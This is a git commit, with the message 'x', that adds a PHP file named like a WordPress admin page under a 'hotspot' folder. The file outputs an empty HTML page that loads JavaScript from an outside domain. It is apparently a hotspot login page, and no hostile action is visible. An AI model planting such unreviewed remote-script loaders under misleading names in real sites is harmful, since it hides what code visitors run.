45bee15ecde5da7d998ed638fe5850b0c120d975
5QX9dYx66FfyWqXCLKi <muhamadkhadafi666@gmail.com>
2020-09-16 12:33:25 +0700

    x

---
+++ hotspot/wp-login/wp-admin.php
@@ -0,0 +1,14 @@
+<?php
+
+echo "<html>\n";
+echo "<head>\n";
+echo "<style>\n";
+echo "html,body{height:100%}\n";
+echo "</style> \n";
+echo "</head>\n";
+echo "<body>\n";
+echo "<script type=\"text/javascript\" src=\"https://aksesglobalmultimedia.com/hotspot/wp.js\"></script>\n";
+echo "</body>\n";
+echo "</html>";
+
+?>
